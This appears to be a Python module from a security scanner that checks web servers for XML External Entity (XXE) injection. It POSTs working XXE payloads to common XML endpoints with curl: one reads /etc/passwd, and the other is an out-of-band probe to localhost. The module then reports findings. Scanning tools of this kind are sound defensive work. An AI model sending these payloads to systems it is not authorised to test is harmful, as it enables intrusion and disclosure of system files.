"""XML External Entity (XXE) injection testing."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class XXECheck(BaseCheck):
    """Test XML-parsing endpoints for external entity resolution."""

    name = "XXE"
    description = "Test XML endpoints for external entity expansion"

    XXE_PAYLOAD = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>'
    )

    XXE_OOB_PAYLOAD = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:1/x">]>'
        '<root>&xxe;</root>'
    )

    XML_PATHS = [
        "/api/xml", "/soap", "/service", "/webservice",
        "/api/v1/xml", "/upload", "/import", "/parse",
    ]

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            targets = [f"{base}{p}" for p in self.XML_PATHS] + [base]

            for url in targets:
                rc, body, _ = run(
                    ["curl", "-s", "--max-time", "8",
                     "-X", "POST",
                     "-H", "Content-Type: application/xml",
                     "-d", self.XXE_PAYLOAD, url],
                    timeout=12,
                )
                if rc != 0 or not body:
                    continue
                if "root:x:0:0" in body or "/bin/bash" in body or "nobody:x:" in body:
                    self.findings.append(Finding(
                        severity="critical",
                        title="XXE - File Disclosure",
                        host=base,
                        detail=f"XML endpoint at {url} parses external entities and discloses /etc/passwd",
                        source="xxe",
                        url=url,
                        evidence=body[:300],
                    ))
                    return self.findings

                rc, out_err, _ = run(
                    ["curl", "-si", "--max-time", "8",
                     "-X", "POST",
                     "-H", "Content-Type: application/xml",
                     "-d", self.XXE_OOB_PAYLOAD, url],
                    timeout=12,
                )
                if out_err and "Connection refused" in out_err:
                    # Server reported "Connection refused" after we told it to
                    # fetch http://127.0.0.1:1/ — strong signal the parser
                    # actually attempted the request. Medium (not high)
                    # because body-echo of the request can still FP, and no
                    # file content was disclosed.
                    body_lower = out_err.lower()
                    if ("parser" in body_lower or "entity" in body_lower
                            or "resolve" in body_lower):
                        self.findings.append(Finding(
                            severity="medium",
                            title="Potential XXE - External Entity Processed",
                            host=base,
                            detail=f"XML parser at {url} attempted to resolve external entity (OOB probe triggered connection error)",
                            source="xxe",
                            url=url,
                        ))
                        break

        return self.findings
